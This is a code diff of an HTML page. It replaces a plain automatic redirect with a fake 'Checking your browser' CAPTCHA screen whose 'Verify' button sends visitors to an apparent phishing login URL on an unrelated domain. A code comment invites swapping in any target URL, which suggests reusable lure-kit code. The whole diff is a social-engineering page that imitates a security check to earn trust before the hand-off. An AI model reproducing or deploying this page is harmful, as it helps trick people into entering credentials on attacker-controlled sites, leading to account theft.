@@ -3,15 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect</title>
+    <title>Checking your browser...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+            border-radius: 5px;
+        }
+        .captcha-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            background: #eee;
+            cursor: pointer;
+        }
+        .captcha-box input {
+            margin-right: 10px;
+        }
+        .verify-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+        .verify-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h2>Checking your browser before accessing</h2>
+        <p>This process is automatic. Your browser will redirect once the verification is complete.</p>
+        <div class="captcha-box" onclick="toggleCaptcha()">
+            <input type="checkbox" id="captcha-checkbox">
+            <label for="captcha-checkbox">I am not a robot</label>
+        </div>
+        <button class="verify-btn" id="verify-btn" disabled onclick="redirectToURL()">Verify CAPTCHA</button>
+    </div>
+
     <script>
-        window.onload = function() {
-            var newURL = "https://pub-26ca94e603e440a1ab64cf5bf4a8228d.r2.dev/index.html";
-            window.location.href = newURL;
-        };
+        function toggleCaptcha() {
+            let checkbox = document.getElementById("captcha-checkbox");
+            let button = document.getElementById("verify-btn");
+            checkbox.checked = !checkbox.checked;
+            button.disabled = !checkbox.checked;
+        }
+
+        function redirectToURL() {
+            window.location.href = "https://login.dgyouths.online/XrxEaSmf"; // Change this to your desired URL
+        }
     </script>
 </body>
-    
 </html>
